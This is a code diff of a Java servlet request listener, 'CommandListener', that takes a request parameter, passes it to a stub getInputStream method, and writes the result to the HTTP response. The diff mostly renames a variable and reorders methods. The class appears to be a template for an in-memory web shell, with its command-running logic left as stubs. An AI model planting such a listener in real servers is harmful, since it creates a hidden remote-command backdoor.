@@ -13,30 +13,14 @@ import java.io.InputStream;
 public class CommandListener implements ServletRequestListener {
     private static String paramName;
 
-    public CommandListener() {
-    }
-
-    @Override
-    public void requestDestroyed(ServletRequestEvent sre) {
-
-    }
-
-    private String getParam(String param) {
-        return param;
-    }
-
-    private InputStream getInputStream(String cmd) throws Exception {
-        return null;
-    }
-
     @Override
     public void requestInitialized(ServletRequestEvent servletRequestEvent) {
         HttpServletRequest request = (HttpServletRequest) servletRequestEvent.getServletRequest();
         try {
-            String cmd = getParam(request.getParameter(paramName));
-            if (cmd != null) {
+            String param = getParam(request.getParameter(paramName));
+            if (param != null) {
                 HttpServletResponse servletResponse = (HttpServletResponse) getResponseFromRequest(request);
-                InputStream inputStream = getInputStream(cmd);
+                InputStream inputStream = getInputStream(param);
                 ServletOutputStream outputStream = servletResponse.getOutputStream();
                 byte[] buf = new byte[8192];
                 int length;
@@ -44,11 +28,25 @@ public class CommandListener implements ServletRequestListener {
                     outputStream.write(buf, 0, length);
                 }
             }
-        } catch (Exception ignored) {
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
     }
 
     private Object getResponseFromRequest(Object request) throws Exception {
         return null;
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
+    }
+
+    @Override
+    public void requestDestroyed(ServletRequestEvent sre) {
+
     }
 }
